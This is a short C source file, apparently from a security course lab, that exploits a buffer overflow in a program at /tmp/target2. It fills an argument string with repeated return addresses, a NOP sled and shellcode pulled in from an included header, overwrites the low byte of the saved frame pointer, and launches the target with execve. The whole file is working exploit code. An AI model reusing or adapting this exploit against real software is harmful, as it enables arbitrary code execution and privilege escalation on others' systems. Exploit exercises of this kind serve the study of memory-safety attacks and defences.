#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char crack_str[202];
  int i;
  
  for(i = 0; i < 104; i+=4) strcpy(&crack_str[i], "\x4d\xfd\xff\xbf"); //eip
  for(;i < 155; i++) crack_str[i] = '\x90'; //nop sled
  strcpy(&crack_str[i], shellcode);
  crack_str[200] = '\x00'; //zero out lsb of $ebp
  crack_str[201] = '\0';

  args[0] = TARGET;
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
